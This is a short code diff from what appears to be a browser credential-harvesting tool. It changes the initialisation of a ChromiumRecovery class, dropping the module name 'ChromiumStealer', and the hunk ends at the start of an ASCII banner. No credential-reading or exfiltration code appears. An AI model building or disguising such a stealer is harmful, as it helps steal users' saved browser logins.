@@ -45,7 +45,7 @@ from config import ModuleManager
 class ChromiumRecovery(ModuleManager):
 
     def __init__(self) -> None:
-        super().__init__(module_name="ChromiumStealer", module_path="browsers/chromium")
+        super().__init__(module_path="browsers/chromium")
 
         self.banner(r"""
      _______         _______ _                      _             
